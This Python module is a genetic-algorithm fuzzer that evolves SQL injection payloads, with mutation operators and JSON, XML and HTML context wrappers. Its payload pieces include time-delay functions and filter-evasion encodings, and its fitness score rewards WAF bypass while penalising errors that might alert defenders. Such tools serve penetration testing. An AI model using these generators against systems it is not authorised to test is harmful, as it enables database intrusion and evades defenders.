"""
Intelligent Fuzzing Engine for SQL Injection

Context-aware payload generation and mutation using genetic algorithms
and machine learning techniques to discover new attack vectors.
"""

import random
import string
from typing import List, Dict, Any, Optional, Set
from dataclasses import dataclass
import logging
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class FuzzedPayload:
    """Represents a fuzzed payload with metadata"""
    payload: str
    generation: int
    parent_payloads: List[str]
    mutation_type: str
    fitness_score: float = 0.0
    success_count: int = 0
    tested: bool = False


class PayloadGene:
    """
    Represents a gene (component) of a SQL injection payload.
    """
    
    GENE_TYPES = {
        'quote': ["'", '"', "`", "''", '""'],
        'logical_op': [' OR ', ' AND ', ' || ', ' && ', ' XOR '],
        'comparison': ['=', '==', '!=', '<>', 'LIKE', 'REGEXP', 'RLIKE'],
        'value': ['1', '0', 'true', 'false', 'NULL', '1=1', '1=2'],
        'comment': ['--', '#', '/*', '*/', '-- ', '/**/', '/*!', '*/'],
        'whitespace': [' ', '/**/', '\t', '\n', '+', '%20', '%09'],
        'terminator': ['--', ';', '#', '/*', '%00'],
        'function': ['SLEEP(5)', 'BENCHMARK()', 'pg_sleep(5)', 'WAITFOR DELAY', 'DBMS_LOCK.SLEEP(5)'],
        'keyword': ['UNION', 'SELECT', 'FROM', 'WHERE', 'ORDER BY', 'GROUP BY'],
        'encoding': ['CHAR(', 'CONCAT(', 'CAST(', 'CONVERT(', 'HEX(', '0x'],
    }
    
    def __init__(self, gene_type: str, value: str = None):
        self.gene_type = gene_type
        self.value = value or random.choice(self.GENE_TYPES.get(gene_type, ['']))
    
    def mutate(self) -> 'PayloadGene':
        """Mutate this gene to a different value of the same type"""
        new_value = random.choice(self.GENE_TYPES.get(self.gene_type, [self.value]))
        return PayloadGene(self.gene_type, new_value)
    
    def __str__(self) -> str:
        return self.value


class IntelligentFuzzingEngine:
    """
    Advanced fuzzing engine using genetic algorithms and context awareness.
    """
    
    def __init__(self, population_size: int = 50, generations: int = 10,
                 mutation_rate: float = 0.3, crossover_rate: float = 0.7):
        """
        Initialize intelligent fuzzing engine.
        
        Args:
            population_size: Number of payloads in each generation
            generations: Number of generations to evolve
            mutation_rate: Probability of mutation
            crossover_rate: Probability of crossover
        """
        self.population_size = population_size
        self.generations = generations
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        
        # Population management
        self.current_population = []
        self.fitness_scores = {}
        self.tested_payloads = set()
        
        # Success tracking
        self.successful_payloads = []
        self.successful_patterns = []
        
        # Context learning
        self.context_info = {
            'detected_database': None,
            'detected_waf': None,
            'working_quotes': set(),
            'working_operators': set(),
            'working_comments': set(),
        }
        
        logger.info(f"Intelligent fuzzing engine initialized: pop={population_size}, gen={generations}")
    
    def seed_initial_population(self, base_payloads: List[str]):
        """
        Seed initial population with base payloads.
        
        Args:
            base_payloads: List of known-good SQL injection payloads
        """
        self.current_population = []
        
        for i, payload in enumerate(base_payloads[:self.population_size]):
            fuzzed = FuzzedPayload(
                payload=payload,
                generation=0,
                parent_payloads=[],
                mutation_type='seed',
                fitness_score=0.5  # Neutral starting fitness
            )
            self.current_population.append(fuzzed)
        
        # Fill remaining population with mutations
        while len(self.current_population) < self.population_size:
            base = random.choice(base_payloads)
            mutated = self.mutate_payload(base)
            fuzzed = FuzzedPayload(
                payload=mutated,
                generation=0,
                parent_payloads=[base],
                mutation_type='initial_mutation',
                fitness_score=0.3
            )
            self.current_population.append(fuzzed)
        
        logger.info(f"Initial population seeded: {len(self.current_population)} payloads")
    
    def mutate_payload(self, payload: str) -> str:
        """
        Mutate a payload using various techniques.
        
        Args:
            payload: Original payload
        
        Returns:
            Mutated payload
        """
        mutation_techniques = [
            self._mutate_quote,
            self._mutate_whitespace,
            self._mutate_comment,
            self._mutate_case,
            self._mutate_encoding,
            self._mutate_concat,
            self._mutate_logical,
        ]
        
        technique = random.choice(mutation_techniques)
        return technique(payload)
    
    def _mutate_quote(self, payload: str) -> str:
        """Mutate quote characters"""
        quotes = ["'", '"', "`", "''", '""', '%27', '%22']
        for old_quote in ["'", '"', "`"]:
            if old_quote in payload:
                new_quote = random.choice(quotes)
                payload = payload.replace(old_quote, new_quote, 1)
                break
        return payload
    
    def _mutate_whitespace(self, payload: str) -> str:
        """Mutate whitespace characters"""
        whitespace_variants = [' ', '/**/', '\t', '+', '%20', '%09', '/**/']
        words = payload.split()
        if len(words) > 1:
            join_char = random.choice(whitespace_variants)
            return join_char.join(words)
        return payload
    
    def _mutate_comment(self, payload: str) -> str:
        """Insert or modify comments"""
        comment_styles = ['/**/', '/*', '*/', '--', '#', '-- ']
        comment = random.choice(comment_styles)
        
        if ' ' in payload:
            parts = payload.split(' ', 1)
            return f"{parts[0]}{comment}{parts[1]}"
        return payload + comment
    
    def _mutate_case(self, payload: str) -> str:
        """Randomize case"""
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _mutate_encoding(self, payload: str) -> str:
        """Apply encoding transformations"""
        if random.random() > 0.5:
            # URL encode some characters
            encoded = ''
            for char in payload:
                if random.random() > 0.7 and char.isalnum():
                    encoded += f'%{ord(char):02x}'
                else:
                    encoded += char
            return encoded
        return payload
    
    def _mutate_concat(self, payload: str) -> str:
        """Insert string concatenation"""
        if "'" in payload:
            # Replace quotes with CONCAT
            return payload.replace("'", "CONCAT('", 1).replace("'", "')", 1)
        return payload
    
    def _mutate_logical(self, payload: str) -> str:
        """Mutate logical operators"""
        replacements = {
            ' OR ': ' || ',
            ' AND ': ' && ',
            '=': ' LIKE ',
            ' || ': ' OR ',
            ' && ': ' AND ',
        }
        
        for old, new in replacements.items():
            if old in payload:
                return payload.replace(old, new, 1)
        return payload
    
    def crossover(self, parent1: str, parent2: str) -> str:
        """
        Perform crossover between two payloads.
        
        Args:
            parent1: First parent payload
            parent2: Second parent payload
        
        Returns:
            Child payload
        """
        # Simple crossover: take prefix from parent1, suffix from parent2
        if len(parent1) < 2 or len(parent2) < 2:
            return parent1
        
        split_point = random.randint(1, min(len(parent1), len(parent2)) - 1)
        child = parent1[:split_point] + parent2[split_point:]
        
        return child
    
    def calculate_fitness(self, payload: FuzzedPayload, test_result: Dict[str, Any]) -> float:
        """
        Calculate fitness score for a payload based on test results.
        
        Args:
            payload: Fuzzed payload
            test_result: Result from testing the payload
        
        Returns:
            Fitness score (0.0-1.0)
        """
        score = 0.0
        
        # Base score for being tested
        score += 0.1
        
        # High score for vulnerability detection
        if test_result.get('vulnerable', False):
            score += 0.5
            payload.success_count += 1
        
        # Score for triggering errors (even if not fully vulnerable)
        if test_result.get('error_detected', False):
            score += 0.2
        
        # Score for causing response changes
        if test_result.get('response_changed', False):
            score += 0.1
        
        # Score for bypassing WAF
        if test_result.get('waf_bypassed', False):
            score += 0.2
        
        # Penalty for causing server errors (might alert defenders)
        if test_result.get('server_error', False):
            score -= 0.1
        
        # Bonus for novelty (not seen before)
        payload_hash = hashlib.md5(payload.payload.encode()).hexdigest()
        if payload_hash not in self.tested_payloads:
            score += 0.05
            self.tested_payloads.add(payload_hash)
        
        # Clamp to 0-1
        return max(0.0, min(1.0, score))
    
    def select_parents(self, num_parents: int = 2) -> List[FuzzedPayload]:
        """
        Select parents for next generation using tournament selection.
        
        Args:
            num_parents: Number of parents to select
        
        Returns:
            List of selected parent payloads
        """
        parents = []
        
        for _ in range(num_parents):
            # Tournament selection
            tournament_size = 5
            tournament = random.sample(self.current_population, 
                                     min(tournament_size, len(self.current_population)))
            winner = max(tournament, key=lambda p: p.fitness_score)
            parents.append(winner)
        
        return parents
    
    def evolve_generation(self, generation_num: int) -> List[FuzzedPayload]:
        """
        Evolve to next generation using genetic operations.
        
        Args:
            generation_num: Current generation number
        
        Returns:
            New population
        """
        new_population = []
        
        # Elitism: Keep top performers
        elite_size = max(1, self.population_size // 10)
        elite = sorted(self.current_population, key=lambda p: p.fitness_score, reverse=True)[:elite_size]
        new_population.extend(elite)
        
        # Generate rest of population
        while len(new_population) < self.population_size:
            # Select parents
            parents = self.select_parents(2)
            
            # Crossover
            if random.random() < self.crossover_rate:
                child_payload = self.crossover(parents[0].payload, parents[1].payload)
                mutation_type = 'crossover'
                parent_list = [parents[0].payload, parents[1].payload]
            else:
                child_payload = parents[0].payload
                mutation_type = 'clone'
                parent_list = [parents[0].payload]
            
            # Mutation
            if random.random() < self.mutation_rate:
                child_payload = self.mutate_payload(child_payload)
                mutation_type += '_mutated'
            
            # Create new payload
            child = FuzzedPayload(
                payload=child_payload,
                generation=generation_num,
                parent_payloads=parent_list,
                mutation_type=mutation_type,
                fitness_score=0.0
            )
            new_population.append(child)
        
        logger.info(f"Generation {generation_num} evolved: {len(new_population)} payloads")
        return new_population
    
    def learn_from_success(self, successful_payload: str, context: Dict[str, Any]):
        """
        Learn from successful payloads to improve future generations.
        
        Args:
            successful_payload: Payload that succeeded
            context: Context information about the success
        """
        self.successful_payloads.append(successful_payload)
        
        # Extract patterns
        if "'" in successful_payload:
            self.context_info['working_quotes'].add("'")
        if '"' in successful_payload:
            self.context_info['working_quotes'].add('"')
        
        if ' OR ' in successful_payload.upper():
            self.context_info['working_operators'].add('OR')
        if ' AND ' in successful_payload.upper():
            self.context_info['working_operators'].add('AND')
        
        if '--' in successful_payload:
            self.context_info['working_comments'].add('--')
        if '/*' in successful_payload:
            self.context_info['working_comments'].add('/*')
        
        logger.info(f"Learned from success: {successful_payload[:50]}... "
                   f"(quotes={self.context_info['working_quotes']}, "
                   f"ops={self.context_info['working_operators']})")
    
    def generate_context_aware_payload(self) -> str:
        """
        Generate payload based on learned context.
        
        Returns:
            Context-aware payload
        """
        # Build payload from learned components
        parts = []
        
        # Use working quote
        if self.context_info['working_quotes']:
            quote = random.choice(list(self.context_info['working_quotes']))
        else:
            quote = "'"
        parts.append(quote)
        
        # Use working operator
        if self.context_info['working_operators']:
            op = random.choice(list(self.context_info['working_operators']))
        else:
            op = 'OR'
        parts.append(f' {op} ')
        
        # Add condition
        parts.append(f'{quote}1{quote}={quote}1{quote}')
        
        # Use working comment
        if self.context_info['working_comments']:
            comment = random.choice(list(self.context_info['working_comments']))
        else:
            comment = '--'
        parts.append(comment)
        
        return ''.join(parts)
    
    def get_best_payloads(self, n: int = 10) -> List[FuzzedPayload]:
        """
        Get top N payloads by fitness score.
        
        Args:
            n: Number of payloads to return
        
        Returns:
            List of best payloads
        """
        sorted_pop = sorted(self.current_population, key=lambda p: p.fitness_score, reverse=True)
        return sorted_pop[:n]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get fuzzing statistics"""
        if not self.current_population:
            return {}
        
        fitness_scores = [p.fitness_score for p in self.current_population]
        
        return {
            'population_size': len(self.current_population),
            'tested_payloads': len(self.tested_payloads),
            'successful_payloads': len(self.successful_payloads),
            'avg_fitness': sum(fitness_scores) / len(fitness_scores) if fitness_scores else 0,
            'max_fitness': max(fitness_scores) if fitness_scores else 0,
            'min_fitness': min(fitness_scores) if fitness_scores else 0,
            'working_quotes': list(self.context_info['working_quotes']),
            'working_operators': list(self.context_info['working_operators']),
            'working_comments': list(self.context_info['working_comments']),
        }


class ContextAwareFuzzer:
    """
    Fuzzer that adapts to specific contexts (JSON, XML, etc.)
    """
    
    def __init__(self, context_type: str = 'unknown'):
        """
        Initialize context-aware fuzzer.
        
        Args:
            context_type: Type of context (json, xml, html, sql, etc.)
        """
        self.context_type = context_type
        self.context_specific_mutations = {
            'json': [self._fuzz_json_value, self._fuzz_json_key, self._fuzz_json_escape],
            'xml': [self._fuzz_xml_attribute, self._fuzz_xml_cdata, self._fuzz_xml_entity],
            'html': [self._fuzz_html_attribute, self._fuzz_html_comment, self._fuzz_html_tag],
            'sql': [self._fuzz_sql_quote, self._fuzz_sql_comment, self._fuzz_sql_operator],
        }
    
    def fuzz_for_context(self, base_payload: str) -> List[str]:
        """
        Generate context-specific fuzzed payloads.
        
        Args:
            base_payload: Base SQL injection payload
        
        Returns:
            List of context-adapted payloads
        """
        mutations = self.context_specific_mutations.get(self.context_type, [])
        if not mutations:
            return [base_payload]
        
        fuzzed = []
        for mutation_func in mutations:
            try:
                fuzzed_payload = mutation_func(base_payload)
                fuzzed.append(fuzzed_payload)
            except Exception as e:
                logger.warning(f"Context fuzzing failed: {e}")
        
        return fuzzed
    
    def _fuzz_json_value(self, payload: str) -> str:
        """Fuzz for JSON value context"""
        return f'{{"test":"{payload}"}}'
    
    def _fuzz_json_key(self, payload: str) -> str:
        """Fuzz for JSON key context"""
        return f'{{"{payload}":"value"}}'
    
    def _fuzz_json_escape(self, payload: str) -> str:
        """Fuzz with JSON escaping"""
        escaped = payload.replace('"', '\\"').replace("'", "\\'")
        return f'{{"key":"{escaped}"}}'
    
    def _fuzz_xml_attribute(self, payload: str) -> str:
        """Fuzz for XML attribute context"""
        return f'<tag attr="{payload}"/>'
    
    def _fuzz_xml_cdata(self, payload: str) -> str:
        """Fuzz for XML CDATA context"""
        return f'<tag><![CDATA[{payload}]]></tag>'
    
    def _fuzz_xml_entity(self, payload: str) -> str:
        """Fuzz with XML entity encoding"""
        return payload.replace('<', '&lt;').replace('>', '&gt;')
    
    def _fuzz_html_attribute(self, payload: str) -> str:
        """Fuzz for HTML attribute context"""
        return f'<input value="{payload}">'
    
    def _fuzz_html_comment(self, payload: str) -> str:
        """Fuzz in HTML comment context"""
        return f'<!-- {payload} -->'
    
    def _fuzz_html_tag(self, payload: str) -> str:
        """Fuzz for HTML tag context"""
        return f'<{payload}>'
    
    def _fuzz_sql_quote(self, payload: str) -> str:
        """Fuzz SQL quote handling"""
        return payload.replace("'", "''")
    
    def _fuzz_sql_comment(self, payload: str) -> str:
        """Fuzz SQL comment injection"""
        return f'{payload}/**/--'
    
    def _fuzz_sql_operator(self, payload: str) -> str:
        """Fuzz SQL operators"""
        return payload.replace(' OR ', ' || ').replace(' AND ', ' && ')
